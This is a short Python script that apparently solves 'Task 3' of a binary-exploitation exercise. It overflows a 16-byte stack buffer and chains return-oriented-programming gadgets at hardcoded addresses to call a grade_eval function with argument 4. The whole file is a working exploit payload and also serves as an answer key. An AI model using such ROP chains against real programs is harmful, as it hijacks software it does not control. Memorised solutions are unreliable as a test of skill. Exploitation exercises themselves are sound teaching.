#!/usr/bin/env python3
"""Task 3: ROP payload for the non-executable, ASLR-enabled stack."""
import sys
import struct

POP_RDI_RET = 0x401A33  # decode from the second byte of `pop r15; ret`
RET = 0x401A34          # stack-alignment gadget
GRADE_EVAL = 0x401978
MAIN_LOOP = 0x4019B8

# input()'s saved return address is 0x18 bytes after its 16-byte buffer.
# ret -> pop rdi; ret -> alignment ret -> grade_eval -> main loop
payload = (
    b"A" * 0x18
    + struct.pack("<Q", POP_RDI_RET)
    + struct.pack("<Q", 4)
    + struct.pack("<Q", RET)
    + struct.pack("<Q", GRADE_EVAL)
    + struct.pack("<Q", MAIN_LOOP)
)

sys.stdout.buffer.write(payload + b"\n")
